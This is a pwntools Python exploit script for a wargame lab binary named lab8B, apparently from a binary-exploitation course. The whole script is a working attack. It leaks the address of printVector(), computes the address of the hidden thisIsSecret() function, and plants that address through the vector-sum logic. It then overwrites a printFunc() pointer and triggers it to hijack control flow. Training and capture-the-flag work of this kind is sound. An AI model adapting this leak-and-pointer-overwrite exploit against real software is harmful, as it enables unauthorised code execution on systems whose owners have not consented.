from pwn import *

# printVector() - thisIsSecret()
THIS_IS_SECRET_OFFSET = 0x10e9 - 0x10a7
BIN_PATH = "/hdd/VM-Shared/levels/lab08/lab8B"

p = process(BIN_PATH)

log.info("Stage #1 - Adding first vector")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")

log.info("Stage #2 - Leaking printVector() address")
p.sendline("3")
p.recv()
p.sendline("1")
buf = p.recvuntil("\nchar")
printvector_addr = int(buf.split()[-2], 16)
log.info("Leaked printVector() address: 0x{:x}".format(printvector_addr))
thisissecret_address = printvector_addr - THIS_IS_SECRET_OFFSET
log.info("thisIsSecret() address: 0x{:x}".format(thisissecret_address))

log.info("Stage #3 - Adding second vector")
p.sendline("1")
p.sendline("2")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline(str(thisissecret_address - 1))
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")

log.info("Stage #4 - Summing the vectors")
p.sendline("2")

log.info("Stage #5 - Overwrite printFunc() address")
p.sendline("4")
p.sendline("4")
p.sendline("4")
p.sendline("4")
p.sendline("4")

log.info("Stage #6 - Load malicious vector into v1")
p.sendline("6")
p.sendline("4")
p.sendline("1")

log.info("Stage #7 - Execution of thisIsSecret()")
p.sendline("3")
p.sendline("1")

p.interactive()
